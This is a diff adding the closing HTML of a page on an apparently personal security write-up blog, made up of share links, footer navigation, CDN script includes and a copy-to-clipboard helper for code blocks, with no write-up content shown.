+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&text=HS-BuildingMagic"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&title=HS-BuildingMagic"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&is_video=false&description=HS-BuildingMagic"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HS-BuildingMagic&body=Check out this article: https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&title=HS-BuildingMagic"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&title=HS-BuildingMagic"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&title=HS-BuildingMagic"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&title=HS-BuildingMagic"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&name=HS-BuildingMagic&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&t=HS-BuildingMagic"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
